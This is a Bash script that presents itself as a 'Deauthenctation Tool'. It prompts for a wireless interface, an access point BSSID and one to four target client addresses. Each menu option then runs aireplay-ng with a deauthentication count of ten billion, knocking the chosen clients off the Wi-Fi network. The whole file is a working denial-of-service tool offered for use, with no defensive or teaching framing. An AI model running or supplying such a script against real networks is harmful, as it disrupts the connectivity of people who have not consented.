#!/bin/bash
Multiple(){
    echo "Enter how many multiple target you want to attack"
    read choicetarget
    if [ $choicetarget -eq 2 ];
    then
        echo "Enter the bssid of the target 1"
        read target1
        echo "Enter the bssid of the target 2"
        read target2
        i=1
        while [ $i -eq 1 ];
        do
            echo "<-------------------------Select from the following target-------------------->"
            echo "1.Target 1"
            echo "2. Target 2"
            echo "3.Exit"
            echo "<------------------------------------------------------------------------------>"
            read attacktarget
            if [ $attacktarget -eq 1 ];
            then
                target=$target1
                aireplay-ng --deauth 10000000000 -a $main -c $target $wifichipset
            elif [ $attacktarget -eq 2 ];
            then
                target=$target2
                aireplay-ng --deauth 10000000000 -a $main -c $target $wifichipset
            elif [ $attacktarget -eq 3 ];
            then
                i=2
            fi
        done
    elif [ $choicetarget -eq 3 ];
    then
        echo "Enter the bssid of the target 1"
        read target1
        echo "Enter the bssid of the target 2"
        read target2
        echo "Enter the bssid of the target 3"
        read target3
        i=1
        while [ $i -eq 1 ];
        do
            echo "<-------------------------Select from the following target-------------------->"
            echo "1.Target 1"
            echo "2. Target 2"
            echo "3.Target 3"
            echo "4.Exit"
            echo "<------------------------------------------------------------------------------>"
            read attacktarget
            if [ $attacktarget -eq 1 ];
            then
                target=$target1
                aireplay-ng --deauth 10000000000 -a $main -c $target $wifichipset
            elif [ $attacktarget -eq 2 ];
            then
                target=$target2
                aireplay-ng --deauth 10000000000 -a $main -c $target $wifichipset
            elif [ $attacktarget -eq 3 ];
            then
                target=$target3
                aireplay-ng --deauth 10000000000 -a $main -c $target $wifichipset
            elif [ $attacktarget -eq 4 ];
            then
                i=2
            fi
        done
    elif [ $choicetarget -eq 4 ];
    then
        echo "Enter the bssid of the target 1"
        read target1
        echo "Enter the bssid of the target 2"
        read target2
        echo "Enter the bssid of the target 3"
        read target3
        echo "Enter the bssid of the target 4"
        read target4
        i=1
        while [ $i -eq 1 ];
        do
            echo "<-------------------------Select from the following target-------------------->"
            echo "1.Target 1"
            echo "2. Target 2"
            echo "3.Target 3"
            echo "4.Target 4"
            echo "5.Exit"
            echo "<------------------------------------------------------------------------------>"
            read attacktarget
            if [ $attacktarget -eq 1 ];
            then
                target=$target1
                aireplay-ng --deauth 10000000000 -a $main -c $target $wifichipset
            elif [ $attacktarget -eq 2 ];
            then
                target=$target2
                aireplay-ng --deauth 10000000000 -a $main -c $target $wifichipset
            elif [ $attacktarget -eq 3 ];
            then
                target=$target3
                aireplay-ng --deauth 10000000000 -a $main -c $target $wifichipset
            elif [ $attacktarget -eq 4 ];
            then
                target=$target4
                aireplay-ng --deauth 10000000000 -a $main -c $target $wifichipset
            elif [ $attacktarget -eq 5 ];
            then
                i=2
            fi
        done
    fi
}
 y=1
 while [ $y -eq 1 ];
 do
    echo "<-------------------------Welcome to Deauthenctation Tool-------------->"
    echo  "Enter wifi chipset name"
    read  wifichipset
    echo  "Enter main user bssid"
    read main
    echo "<-----------------------------Select the target type--------------------------->"
    echo "1.SIngle"
    echo "2.Multiple"
    echo "3. Exit"
    echo "<-------------------------------------------------------------------------------->"
    read choice
    if [ $choice -eq 1 ];
    then
        echo "Enter the target bssid"
        read target
        n=1
        while [ $n -eq 1 ];
        do
            echo "1.Attack"
            echo "2.Return"
            read nextchoice
            if [ $nextchoice -eq 1 ];
            then
                aireplay-ng --deauth 10000000000 -a $main -c $target $wifichipset
            elif [ $nextchoice -eq 2 ];
            then
             n=2
            fi
        done
    elif [ $choice -eq 2 ];
    then
        Multiple
    elif [ $choice -eq 3 ];
    then
        y=2
    fi
done
